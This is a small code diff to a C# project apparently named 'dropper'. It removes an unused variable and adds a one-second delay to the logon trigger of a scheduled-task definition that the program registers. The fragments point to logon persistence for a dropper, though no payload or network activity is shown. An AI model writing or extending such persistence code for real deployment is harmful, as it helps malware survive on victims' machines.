@@ -10,7 +10,6 @@ namespace dropper
     {
         static void Main(string[] args)
         {
-            IntPtr wow64val = IntPtr.Zero;
             Process schproc = new Process()
             {
                 StartInfo = new ProcessStartInfo()
@@ -37,6 +36,7 @@ namespace dropper
   <Triggers>
     <LogonTrigger>
       <Enabled>true</Enabled>
+      <Delay>PT1S</Delay>
     </LogonTrigger>
   </Triggers>
   <Principals>
